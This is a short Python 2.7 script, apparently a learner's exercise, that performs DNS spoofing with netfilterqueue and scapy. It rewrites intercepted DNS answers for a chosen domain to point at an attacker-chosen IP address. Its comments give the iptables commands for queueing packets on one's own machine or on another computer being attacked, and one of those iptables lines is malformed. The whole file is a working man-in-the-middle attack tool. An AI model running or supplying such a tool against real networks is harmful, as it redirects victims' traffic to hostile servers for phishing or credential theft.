#!/usr/bin/env python

#DNS Spoofing program pyhton 2.7
#iptables -I OUTPUT -j NFQUEUE --queue-num 0 this creats a queue for the packets
#iptables -I OUTPUT -j INPUT --queue-num 0 this creats a queue for the packets for your own PC
#chage to -j FOWARD id you are attacking anohter computher
#iptables --flush when done
#run before using program

import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.DNSRR): #DNSRR is DNS Responce DNSRQ is DNS Request
        qname = scapy_packet[scapy.DNSQR].qname #DNSQR is the layer of the packet and .qname is the part of the layer

        if "put destnation" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="desired IP addr here so send the traffic to")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            #removing some packet layers
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet)) #applying the changes we just made to the new packet that is going to be sent out

    packet.accept() #fowards packet to target

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet) #connects the queue in the program to the queue in the terminal
#The 0 is the set num for the que instance, process_packet is a callback funtion
queue.run()
